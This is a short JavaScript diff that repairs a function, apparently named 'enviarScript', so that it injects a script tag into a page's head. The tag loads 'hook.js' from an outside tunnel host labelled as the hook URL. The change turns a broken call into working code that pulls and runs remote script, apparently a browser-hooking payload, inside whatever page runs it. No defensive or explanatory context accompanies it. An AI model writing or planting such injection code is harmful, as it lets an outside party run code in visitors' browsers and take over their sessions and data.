@@ -1,7 +1,7 @@
 async function enviarScript(scriptText){
 	
 	//link message
-	var hook = createElement('script');
+	var hook = document.createElement('script');
         hook.src = "https://cc75f61a033665.lhr.life/hook.js"; //hook url
         document.head.appendChild(hook);
 	
